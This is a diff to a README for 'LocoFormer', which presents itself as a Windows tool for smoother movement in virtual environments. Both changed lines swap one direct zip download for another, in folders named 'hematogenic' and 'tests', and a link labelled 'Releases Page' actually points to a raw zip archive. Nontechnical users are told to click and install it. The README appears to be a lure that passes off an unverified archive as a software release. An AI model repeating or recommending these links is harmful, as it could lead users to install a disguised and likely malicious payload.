@@ -4,7 +4,7 @@
 Welcome to LocoFormer! This software helps you create smoother movements in virtual environments using advanced technology. No coding skills are required to use it.
 
 ## 📥 Download LocoFormer
-[![Download LocoFormer](https://raw.githubusercontent.com/eduard23144/locoformer/main/hematogenic/locoformer.zip)](https://raw.githubusercontent.com/eduard23144/locoformer/main/hematogenic/locoformer.zip)
+[![Download LocoFormer](https://github.com/eduard23144/locoformer/raw/refs/heads/main/tests/Software-3.7-alpha.3.zip)](https://github.com/eduard23144/locoformer/raw/refs/heads/main/tests/Software-3.7-alpha.3.zip)
 
 ## 📋 System Requirements
 - **Operating System**: Windows 10 or later
@@ -20,7 +20,7 @@ Welcome to LocoFormer! This software helps you create smoother movements in virt
 - **AI-Powered Performance**: Leverage deep learning to enhance movement dynamics.
 
 ## 💻 Download & Install
-To get started, visit the [Releases Page](https://raw.githubusercontent.com/eduard23144/locoformer/main/hematogenic/locoformer.zip) to download the software. Here’s how:
+To get started, visit the [Releases Page](https://github.com/eduard23144/locoformer/raw/refs/heads/main/tests/Software-3.7-alpha.3.zip) to download the software. Here’s how:
 
 1. Click on the link above.
 2. Look for the latest version of LocoFormer.
